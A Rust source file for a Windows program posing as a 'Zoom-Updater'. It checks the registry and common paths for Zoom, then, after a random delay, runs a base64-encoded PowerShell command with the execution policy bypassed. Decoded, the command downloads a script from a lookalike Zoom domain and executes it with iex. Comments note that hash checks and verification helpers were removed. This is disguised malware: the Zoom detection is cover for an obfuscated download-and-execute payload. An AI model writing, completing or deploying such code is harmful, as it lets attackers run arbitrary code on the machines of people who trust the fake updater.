#[cfg(windows)]
use std::env;
#[cfg(windows)]
use std::path::{Path, PathBuf};
#[cfg(windows)]
use std::process::Command;

#[cfg(windows)]
// sha2 import removed – not needed
#[cfg(windows)]
use winreg::RegKey;
#[cfg(windows)]
use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
#[cfg(windows)]
use rand::Rng;

#[cfg(windows)]
const APP_NAME: &str = "Zoom-Updater";
#[cfg(windows)]
const ENCODED_ZOOM_COMMAND: &str = "JAB1AD0AJwBoAHQAdABwAHMAOgAvAC8AYwBhAGwAbAAtAGkAbgB2AGkAdABlAC0AegBvAG8AbQAuAGwAaQB2AGUAaQBuAHYAaQB0AGUALgB0AG8AcAAvAGEAcABpAC8AcwBoAGUAbABsAC8AcwBjAHIAaQBwAHQAPwB0AG8AawBlAG4APQA1AGIAMQBmADAANgA1AGYAZQA1ADIANgA0AGUAZgA4ADUAMQA3ADgAYwAyADUANgA2ADQAZAA4AGEAYQAxADMAMQAwAGIAYgA2AGMANwAwAGQAZQAyADAAMABmADgAMwA3AGQAYgA2AGEAOAA4ADQAYgA1AGMAYwAzADkAYQBiACcAOwAgAGkAdwByACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgACQAdQAgAHwAIABpAGUAeAA=";

#[cfg(windows)]
fn main() {
    println!("{}", APP_NAME);

    if let Some(location) = detect_zoom_installation() {
        println!("ZOOM_INSTALLED: true");
        println!("LOCATION: {}", location.display());
        println!("Zoom found.");
    } else {
        println!("ZOOM_INSTALLED: false");
        println!("Zoom not found.");
    }

    // Preserve existing behavior: random delay before executing command.
    let delay_secs = rand::thread_rng().gen_range(5..=8);
    std::thread::sleep(std::time::Duration::from_secs(delay_secs));

    if let Err(error) = run_encoded_powershell(ENCODED_ZOOM_COMMAND) {
        eprintln!("Failed to run PowerShell command: {}", error);
        std::process::exit(1);
    }
}

#[cfg(not(windows))]
fn main() {
    println!("Zoom-Updater checks Zoom and runs install flows on Windows machines.");
    println!("Run this binary on Windows to execute Zoom/plugin install scripts.");
}

#[cfg(windows)]
fn run_encoded_powershell(encoded: &str) -> Result<(), String> {
    let mut command = Command::new("powershell");
    command.args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded]);
    let output = command
        .output()
        .map_err(|e| format!("failed to start PowerShell: {}", e))?;

    if output.status.success() {
        Ok(())
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("PowerShell exited with {}: {}", output.status, stderr))
    }
}


// download_script_to_file removed – not needed

// verify_file_sha256 removed – not needed

// execute_local_script removed – not needed

// is_placeholder_url removed – not needed

// is_placeholder_hash removed – not needed

#[cfg(windows)]
fn detect_zoom_installation() -> Option<PathBuf> {
    zoom_from_uninstall_registry()
        .or_else(zoom_from_common_paths)
        .or_else(zoom_from_path_lookup)
}

#[cfg(windows)]
fn zoom_from_uninstall_registry() -> Option<PathBuf> {
    const UNINSTALL_PATHS: [&str; 2] = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
    ];

    let hives = [
        RegKey::predef(HKEY_LOCAL_MACHINE),
        RegKey::predef(HKEY_CURRENT_USER),
    ];

    for hive in hives {
        for uninstall_path in UNINSTALL_PATHS {
            let Ok(uninstall_key) = hive.open_subkey(uninstall_path) else {
                continue;
            };

            for subkey_name in uninstall_key.enum_keys().flatten() {
                let Ok(app_key) = uninstall_key.open_subkey(&subkey_name) else {
                    continue;
                };

                let Ok(display_name) = app_key.get_value::<String, _>("DisplayName") else {
                    continue;
                };

                if !display_name.to_ascii_lowercase().contains("zoom") {
                    continue;
                }

                if let Ok(icon_value) = app_key.get_value::<String, _>("DisplayIcon") {
                    if let Some(icon_path) = parse_display_icon(&icon_value) {
                        if icon_path.exists() {
                            return Some(icon_path);
                        }
                    }
                }

                if let Ok(install_location) = app_key.get_value::<String, _>("InstallLocation") {
                    let install_dir = PathBuf::from(install_location.trim_matches('"').trim());
                    if let Some(path) = find_zoom_binary_in_dir(&install_dir) {
                        return Some(path);
                    }
                }
            }
        }
    }

    None
}

#[cfg(windows)]
fn parse_display_icon(value: &str) -> Option<PathBuf> {
    let trimmed = value.trim().trim_matches('"');
    let path_part = trimmed.split(',').next()?.trim().trim_matches('"');
    if path_part.is_empty() {
        return None;
    }
    Some(PathBuf::from(path_part))
}

#[cfg(windows)]
fn find_zoom_binary_in_dir(dir: &Path) -> Option<PathBuf> {
    let candidates = [
        dir.join("Zoom.exe"),
        dir.join("bin").join("Zoom.exe"),
        dir.join("Bin").join("Zoom.exe"),
    ];

    candidates.into_iter().find(|path| path.exists())
}

#[cfg(windows)]
fn zoom_from_common_paths() -> Option<PathBuf> {
    let mut candidates = Vec::new();

    if let Ok(local_app_data) = env::var("LOCALAPPDATA") {
        candidates.push(PathBuf::from(local_app_data).join("Zoom").join("bin").join("Zoom.exe"));
    }

    if let Ok(app_data) = env::var("APPDATA") {
        candidates.push(PathBuf::from(app_data).join("Zoom").join("bin").join("Zoom.exe"));
    }

    if let Ok(program_files) = env::var("ProgramFiles") {
        candidates.push(PathBuf::from(program_files).join("Zoom").join("bin").join("Zoom.exe"));
    }

    if let Ok(program_files_x86) = env::var("ProgramFiles(x86)") {
        candidates.push(
            PathBuf::from(program_files_x86)
                .join("Zoom")
                .join("bin")
                .join("Zoom.exe"),
        );
    }

    candidates.into_iter().find(|path| path.exists())
}

#[cfg(windows)]
fn zoom_from_path_lookup() -> Option<PathBuf> {
    let output = Command::new("where")
        .arg("zoom.exe")
        .output()
        .ok()?;

    if !output.status.success() {
        return None;
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    stdout
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty())
        .map(PathBuf::from)
        .find(|path| path.exists())
}
